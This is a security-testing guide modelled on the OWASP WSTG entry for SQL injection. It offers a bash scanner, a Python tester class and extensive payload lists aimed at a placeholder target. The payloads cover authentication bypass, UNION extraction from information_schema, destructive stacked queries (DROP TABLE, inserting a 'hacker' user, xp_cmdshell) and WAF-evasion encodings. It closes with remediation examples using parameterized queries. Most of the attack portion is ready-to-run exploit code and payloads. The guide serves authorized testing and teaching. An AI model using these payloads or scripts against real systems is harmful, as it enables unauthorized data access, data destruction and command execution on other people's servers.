# WSTG-INPV-05: Testing for SQL Injection

## Test ID
WSTG-INPV-05

## Test Name
Testing for SQL Injection

## High-Level Description

SQL Injection occurs when untrusted data is sent to an interpreter as part of a command or query. The attacker's hostile data can trick the interpreter into executing unintended commands or accessing data without proper authorization. SQL injection can result in data theft, data loss, denial of service, or complete system compromise.

---

## What to Check

- [ ] User input in SQL queries
- [ ] Error-based injection
- [ ] Union-based injection
- [ ] Blind injection (Boolean/Time)
- [ ] Second-order injection
- [ ] Stored procedures

---

## How to Test

### Step 1: Identify Injection Points

```bash
#!/bin/bash
TARGET="https://target.com"

# Common injection points
ENDPOINTS=(
    "/search?q=test"
    "/product?id=1"
    "/user?name=admin"
    "/login"
    "/api/users?filter=active"
)

# Basic SQLi detection payloads
PAYLOADS=(
    "'"
    "''"
    "\`"
    "\")"
    "'"
    "1' OR '1'='1"
    "1 OR 1=1"
    "1' OR '1'='1'--"
    "1' OR '1'='1'/*"
    "1' AND '1'='2"
    "1' WAITFOR DELAY '0:0:5'--"
    "1'; SELECT SLEEP(5);--"
)

for endpoint in "${ENDPOINTS[@]}"; do
    for payload in "${PAYLOADS[@]}"; do
        response=$(curl -s "$TARGET$endpoint$payload" 2>&1)

        # Check for SQL error messages
        if echo "$response" | grep -qiE "sql|mysql|oracle|syntax|query|ORA-|SQL Server"; then
            echo "[VULN] Potential SQLi at: $endpoint with: $payload"
        fi
    done
done
```

### Step 2: SQL Injection Tester

```python
#!/usr/bin/env python3
"""
SQL Injection Vulnerability Tester
"""

import requests
import time
import re
from urllib.parse import urljoin, quote

class SQLInjectionTester:
    def __init__(self, url):
        self.url = url
        self.findings = []
        self.session = requests.Session()
        self.timeout = 30

    # SQL Error patterns by database
    ERROR_PATTERNS = {
        'MySQL': [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_.*",
            r"MySqlException",
            r"valid MySQL result",
            r"check the manual that corresponds to your MySQL server version",
        ],
        'PostgreSQL': [
            r"PostgreSQL.*ERROR",
            r"Warning.*\Wpg_.*",
            r"valid PostgreSQL result",
            r"Npgsql\.",
            r"PG::SyntaxError:",
        ],
        'MSSQL': [
            r"Driver.* SQL[\-\_\ ]*Server",
            r"OLE DB.* SQL Server",
            r"(\W|\A)SQL Server.*Driver",
            r"Warning.*mssql_.*",
            r"(\W|\A)SQL Server.*[0-9a-fA-F]{8}",
            r"System\.Data\.SqlClient\.SqlException",
            r"Unclosed quotation mark after the character string",
        ],
        'Oracle': [
            r"\bORA-[0-9][0-9][0-9][0-9]",
            r"Oracle error",
            r"Oracle.*Driver",
            r"Warning.*\Woci_.*",
            r"Warning.*\Wora_.*",
        ],
        'SQLite': [
            r"SQLite/JDBCDriver",
            r"SQLite\.Exception",
            r"System\.Data\.SQLite\.SQLiteException",
            r"Warning.*sqlite_.*",
            r"Warning.*SQLite3::",
            r"\[SQLITE_ERROR\]",
        ],
    }

    # Basic injection payloads
    BASIC_PAYLOADS = [
        "'",
        "''",
        '"',
        '`',
        "')",
        "'))",
        "\")",
        "`))",
        "'--",
        "'/*",
        "1'",
        "1\"",
    ]

    # Boolean-based payloads
    BOOLEAN_PAYLOADS = [
        ("' OR '1'='1", "' OR '1'='2"),
        ("' OR 1=1--", "' OR 1=2--"),
        ("1 OR 1=1", "1 OR 1=2"),
        ("1' OR '1'='1'--", "1' OR '1'='2'--"),
        ("\" OR \"1\"=\"1", "\" OR \"1\"=\"2"),
    ]

    # Time-based payloads
    TIME_PAYLOADS = {
        'MySQL': "' OR SLEEP(5)--",
        'PostgreSQL': "'; SELECT pg_sleep(5);--",
        'MSSQL': "'; WAITFOR DELAY '0:0:5';--",
        'Oracle': "' OR DBMS_PIPE.RECEIVE_MESSAGE('a',5)='a",
        'SQLite': "' OR (SELECT COUNT(*) FROM sqlite_master,sqlite_master,sqlite_master)--",
    }

    # UNION-based payloads
    UNION_PAYLOADS = [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
    ]

    def test_error_based(self, param, method='GET'):
        """Test for error-based SQL injection"""
        print(f"\n[*] Testing error-based SQLi on: {param}")

        for payload in self.BASIC_PAYLOADS:
            try:
                if method == 'GET':
                    response = self.session.get(self.url, params={param: payload}, timeout=self.timeout)
                else:
                    response = self.session.post(self.url, data={param: payload}, timeout=self.timeout)

                # Check for database errors
                for db, patterns in self.ERROR_PATTERNS.items():
                    for pattern in patterns:
                        if re.search(pattern, response.text, re.IGNORECASE):
                            print(f"[VULN] Error-based SQLi detected! (Database: {db})")
                            print(f"  Payload: {payload}")
                            self.findings.append({
                                'type': 'Error-based SQLi',
                                'parameter': param,
                                'payload': payload,
                                'database': db,
                                'severity': 'Critical'
                            })
                            return True

            except Exception as e:
                pass

        return False

    def test_boolean_based(self, param, method='GET'):
        """Test for boolean-based blind SQL injection"""
        print(f"\n[*] Testing boolean-based blind SQLi on: {param}")

        # Get baseline response
        if method == 'GET':
            baseline = self.session.get(self.url, params={param: 'test'}, timeout=self.timeout)
        else:
            baseline = self.session.post(self.url, data={param: 'test'}, timeout=self.timeout)

        baseline_len = len(baseline.text)

        for true_payload, false_payload in self.BOOLEAN_PAYLOADS:
            try:
                if method == 'GET':
                    true_response = self.session.get(self.url, params={param: true_payload}, timeout=self.timeout)
                    false_response = self.session.get(self.url, params={param: false_payload}, timeout=self.timeout)
                else:
                    true_response = self.session.post(self.url, data={param: true_payload}, timeout=self.timeout)
                    false_response = self.session.post(self.url, data={param: false_payload}, timeout=self.timeout)

                true_len = len(true_response.text)
                false_len = len(false_response.text)

                # Check for significant difference
                if abs(true_len - false_len) > 50:
                    print(f"[VULN] Boolean-based blind SQLi detected!")
                    print(f"  True payload ({true_len} bytes): {true_payload}")
                    print(f"  False payload ({false_len} bytes): {false_payload}")
                    self.findings.append({
                        'type': 'Boolean-based Blind SQLi',
                        'parameter': param,
                        'true_payload': true_payload,
                        'false_payload': false_payload,
                        'severity': 'Critical'
                    })
                    return True

            except Exception as e:
                pass

        return False

    def test_time_based(self, param, method='GET'):
        """Test for time-based blind SQL injection"""
        print(f"\n[*] Testing time-based blind SQLi on: {param}")

        # Get baseline response time
        start = time.time()
        if method == 'GET':
            self.session.get(self.url, params={param: 'test'}, timeout=self.timeout)
        else:
            self.session.post(self.url, data={param: 'test'}, timeout=self.timeout)
        baseline_time = time.time() - start

        for db, payload in self.TIME_PAYLOADS.items():
            try:
                start = time.time()
                if method == 'GET':
                    self.session.get(self.url, params={param: payload}, timeout=self.timeout)
                else:
                    self.session.post(self.url, data={param: payload}, timeout=self.timeout)
                response_time = time.time() - start

                # Check if response took significantly longer (5+ seconds)
                if response_time > baseline_time + 4:
                    print(f"[VULN] Time-based blind SQLi detected! (Database: {db})")
                    print(f"  Payload: {payload}")
                    print(f"  Response time: {response_time:.2f}s (baseline: {baseline_time:.2f}s)")
                    self.findings.append({
                        'type': 'Time-based Blind SQLi',
                        'parameter': param,
                        'payload': payload,
                        'database': db,
                        'response_time': response_time,
                        'severity': 'Critical'
                    })
                    return True

            except requests.exceptions.Timeout:
                print(f"[VULN] Time-based blind SQLi - Request timed out! (Database: {db})")
                self.findings.append({
                    'type': 'Time-based Blind SQLi',
                    'parameter': param,
                    'payload': payload,
                    'database': db,
                    'severity': 'Critical'
                })
                return True
            except Exception as e:
                pass

        return False

    def test_union_based(self, param, method='GET'):
        """Test for UNION-based SQL injection"""
        print(f"\n[*] Testing UNION-based SQLi on: {param}")

        for payload in self.UNION_PAYLOADS:
            try:
                if method == 'GET':
                    response = self.session.get(self.url, params={param: payload}, timeout=self.timeout)
                else:
                    response = self.session.post(self.url, data={param: payload}, timeout=self.timeout)

                # Check for successful UNION injection indicators
                if 'NULL' not in response.text:
                    # The UNION might have worked if no error and different response
                    pass

            except Exception as e:
                pass

        return False

    def generate_report(self):
        """Generate findings report"""
        print("\n" + "="*60)
        print("SQL INJECTION VULNERABILITY REPORT")
        print("="*60)

        if not self.findings:
            print("\nNo SQL injection vulnerabilities confirmed.")
            print("Note: Manual testing may still reveal vulnerabilities.")
        else:
            print(f"\nFound {len(self.findings)} vulnerabilities:\n")
            for f in self.findings:
                print(f"[{f['severity']}] {f['type']}")
                print(f"  Parameter: {f['parameter']}")
                if 'payload' in f:
                    print(f"  Payload: {f['payload']}")
                if 'database' in f:
                    print(f"  Database: {f['database']}")
                print()

    def run_tests(self, params=None, method='GET'):
        """Run all SQL injection tests"""
        if params is None:
            params = ['id', 'q', 'search', 'user', 'name', 'page', 'category']

        for param in params:
            self.test_error_based(param, method)
            self.test_boolean_based(param, method)
            self.test_time_based(param, method)
            self.test_union_based(param, method)

        self.generate_report()

# Usage
tester = SQLInjectionTester("https://target.com/product")
tester.run_tests(params=['id'])
```

### Step 3: Manual Testing Payloads

```sql
-- Error-based Detection
'
''
`
")
')
'))
`))

-- Authentication Bypass
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
admin'--
admin'#
admin'/*
' OR 1=1--
" OR 1=1--
' OR 'x'='x
') OR ('1'='1

-- UNION-based (find column count)
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

-- Extract data (MySQL)
' UNION SELECT @@version,NULL,NULL--
' UNION SELECT user(),database(),NULL--
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--

-- Time-based Blind (MySQL)
' OR SLEEP(5)--
' AND SLEEP(5)--
1' AND SLEEP(5)#

-- Time-based Blind (MSSQL)
'; WAITFOR DELAY '0:0:5'--
1'; WAITFOR DELAY '0:0:5'--

-- Time-based Blind (PostgreSQL)
'; SELECT pg_sleep(5);--

-- Stacked Queries
'; INSERT INTO users VALUES('hacker','pass')--
'; DROP TABLE users--
'; EXEC xp_cmdshell('whoami')--
```

### Step 4: Advanced Techniques

```python
# WAF Bypass Techniques

WAF_BYPASS_PAYLOADS = [
    # Case manipulation
    "' UnIoN SeLeCt NULL--",

    # Inline comments
    "' UN/**/ION SEL/**/ECT NULL--",
    "/*!50000UNION*/ /*!50000SELECT*/ NULL--",

    # URL encoding
    "%27%20OR%20%271%27%3D%271",
    "%2527%2520OR%2520%25271%2527%253D%25271",  # Double encoding

    # Unicode encoding
    "' %u0055NION %u0053ELECT NULL--",

    # Null bytes
    "%00' OR '1'='1",

    # Scientific notation
    "1e0' OR '1'='1",

    # Hex encoding
    "' OR 0x31=0x31--",

    # String concatenation (MySQL)
    "' OR 'a'='a' OR 'a'='a",

    # Tab/newline instead of space
    "'\tOR\t'1'='1",
    "'\nOR\n'1'='1",
]

# Second-Order SQLi
# Payload stored first, executed later
# Example: Register username as: admin'--
# Later when username is used in another query, injection occurs
```

---

## Tools

| Tool | Purpose |
|------|---------|
| SQLMap | Automated SQL injection |
| Burp Suite | Manual testing |
| Havij | SQL injection automation |
| jSQL Injection | GUI-based SQLi tool |
| NoSQLMap | NoSQL injection |

---

## Remediation

```python
# Python - Use parameterized queries
import sqlite3

# VULNERABLE
def get_user_vulnerable(username):
    query = f"SELECT * FROM users WHERE username = '{username}'"
    cursor.execute(query)  # SQL Injection!

# SECURE - Parameterized query
def get_user_secure(username):
    query = "SELECT * FROM users WHERE username = ?"
    cursor.execute(query, (username,))

# SECURE - Using ORM (SQLAlchemy)
from sqlalchemy.orm import Session

def get_user_orm(session: Session, username: str):
    return session.query(User).filter(User.username == username).first()
```

```java
// Java - PreparedStatement
// VULNERABLE
String query = "SELECT * FROM users WHERE id = " + userId;
Statement stmt = connection.createStatement();
ResultSet rs = stmt.executeQuery(query);

// SECURE
String query = "SELECT * FROM users WHERE id = ?";
PreparedStatement pstmt = connection.prepareStatement(query);
pstmt.setInt(1, userId);
ResultSet rs = pstmt.executeQuery();
```

```php
<?php
// PHP - PDO with prepared statements
// VULNERABLE
$query = "SELECT * FROM users WHERE id = " . $_GET['id'];
$result = $pdo->query($query);

// SECURE
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$_GET['id']]);
$result = $stmt->fetchAll();
?>
```

---

## Risk Assessment

| Finding | CVSS | Severity |
|---------|------|----------|
| SQL Injection (unauthenticated) | 9.8 | Critical |
| SQL Injection (authenticated) | 8.8 | High |
| Blind SQL Injection | 8.6 | High |
| Second-order SQL Injection | 8.6 | High |

---

## CWE Categories

| CWE ID | Title |
|--------|-------|
| **CWE-89** | Improper Neutralization of Special Elements used in an SQL Command |

---

## References

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQL Injection](https://portswigger.net/web-security/sql-injection)
- [SQLMap Documentation](https://github.com/sqlmapproject/sqlmap/wiki)
- [PayloadsAllTheThings - SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

---

## Checklist

```
[ ] Error-based injection tested
[ ] Boolean-based blind tested
[ ] Time-based blind tested
[ ] UNION-based injection tested
[ ] Second-order injection considered
[ ] WAF bypass techniques tested
[ ] All input parameters tested
[ ] Findings documented
```
